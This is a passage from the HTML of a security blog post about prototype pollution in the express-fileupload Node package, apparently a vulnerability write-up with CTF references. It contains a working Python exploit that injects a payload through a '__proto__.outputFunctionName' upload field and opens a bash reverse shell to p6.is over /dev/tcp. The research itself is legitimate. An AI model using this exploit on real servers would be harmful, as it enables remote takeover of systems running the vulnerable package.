class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://p6.is:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://p6.is:7777&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a target="_blank" rel="noopener" href="https://github.com/richardgirges/express-fileupload/issues/236">https://github.com/richardgirges/express-fileupload/issues/236</a></li><li><a target="_blank" rel="noopener" href="https://www.npmjs.com/package/express-fileupload">https://www.npmjs.com/package/express-fileupload</a></li><li><a target="_blank" rel="noopener" href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></li></ul></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Real-world-JS-1"><span class="toc-number">1.</span> <span class="toc-text">Real-world JS 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#express-fileupload"><span class="toc-number">1.1.</span> <span class="toc-text">express-fileupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-get-shell"><span class="toc-number">1.2.</span> <span class="toc-text">How to get shell?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/Real-World-JS-1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/Real-World-JS-1/&text=Real-world JS - 1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>